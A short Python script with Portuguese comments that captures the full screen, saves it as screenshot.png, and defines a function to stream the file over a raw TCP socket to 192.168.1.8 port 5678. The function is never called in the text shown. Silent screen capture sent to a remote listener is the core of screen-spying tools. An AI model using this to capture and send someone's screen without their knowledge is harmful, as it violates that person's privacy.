import pyautogui
import os
import socket

# Captura a tela inteira
screenshot = pyautogui.screenshot()

# Salva a captura de tela em um arquivo

screenshot.save("screenshot.png")
file_path = os.path.join(os.getcwd(), "screenshot.png")
def send_file(file_path):
    SERVER_IP = '192.168.1.8'
    PORT = 5678
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((SERVER_IP, PORT))
            print(f'Conectado a {SERVER_IP}')
            with open(file_path, 'rb') as file:
                while True:
                    data = file.read(4096)
                    if not data:
                        break
                    s.sendall(data)
            print('File send')
        except Exception as e:
            print(f'Erro ao enviar arquivo: {e}')
